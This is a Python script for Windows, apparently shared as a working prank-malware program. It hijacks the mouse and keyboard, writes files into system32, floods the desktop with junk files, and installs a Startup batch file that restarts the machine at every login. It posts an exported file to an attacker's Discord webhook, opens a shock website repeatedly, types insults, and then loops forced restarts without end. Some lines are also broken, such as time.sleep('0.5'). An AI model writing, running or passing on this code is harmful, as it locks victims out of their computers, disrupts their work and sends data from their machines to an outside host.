import subprocess
import getpass
import os
from sys import platform
import pyautogui
pyautogui.FAILSAFE = False
import random
from random import randint
import string
from discord_webhook import DiscordWebhook
import time

so = platform
if so != "win32":
    os.system('echo Your operation system is not compatible')
    
weburl = 'INSERT YOUR DISCORD WEBHOOK HERE' #enter here your discord webhook url
username = os.environ["USERNAME"]
userprofile = os.environ["USERPROFILE"]

subprocess.getoutput('md "%systemroot%\system32\WinMSConfig"')
subprocess.getoutput('echo Good, you are here >> "%systemroot%\system32\WinMSConfig\Start.vbs"')
subprocess.getoutput('cd "%systemroot%\system32\WinMSConfig"')
subprocess.getoutput('start Start.vbs')
subprocess.getoutput('timeout 1 >nul /nobreak')


mouse = pyautogui
keyboard = pyautogui

const = 0
notepad = 1
while const <= 150:
	if notepad == 1:
		os.system('start notepad')
	rndvalueX = randint(0, 1200)
	rndvalueY = randint(0, 500)
	mouse.moveTo(rndvalueX, rndvalueY)
	rndletter1 = random.choice(string.ascii_letters)
	rndletter2 = random.choice(string.ascii_letters)
	rndletter3 = random.choice(string.ascii_letters)
	keyboard.write(rndletter1 + rndletter2 + rndletter3, interval=0.01)
	notepad = notepad - 1
	if notepad == 0:
		notepad += 3
	const += 1

write = 0
while write <= 70:
	subprocess.getoutput('echo %random%%random%%random%%random%%random%%random%%random% >> "%userprofile\desktop\%random%.txt"')
	write += 1
if write == 70 or write == 71:
	subprocess.getoutput('echo The end >> "%userprofile\desktop\The end"')
subprocess.getoutput('if exist "%userprofile\desktop\The end" cd "%userprofile%\desktop"')
subprocess.getoutput('if exist "%userprofile\desktop\The end" start The end.txt')
subprocess.getoutput('timeout 3 >nul /nobreak')
with keyboard.hold('win'):
	keyboard.press('m')
os.system('start notepad')
time.sleep(0.5)
keyboard.write('You have noescape', interval=0.01)
user = getpass.getuser()
subprocess.getoutput('echo shutdown /r /t 0 >> "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Shut.bat"')
def export():
    subprocess.getoutput('echo systeminfo >> "%userprofile%\AppData\Sysinfo.txt"')
    webhook = DiscordWebhook(url=weburl, content='File exported')
    with open(f'{userprofile}/AppData/Sysinfo.txt', "rb") as f:
        webhook.add_file(file=f.read(), filename='System info.txt')
    r = webhook.execute()
    subprocess.getoutput('if exist "%userprofile%\AppData\Sysinfo.txt" del "%userprofile%\AppData\Sysinfo.txt"/q')
export()
time.sleep('0.5')
for i in range(0,15):
    os.system('explorer https://youareanidiot.cc')
with keyboard.hold('win'):
    keyboard.press('d')
os.system('notepad')
keyboard.write('Goodbye bitch', interval=0.01)
time.sleep(0.5)
while True:
    subprocess.getoutput('shutdown /r /t 0 /f')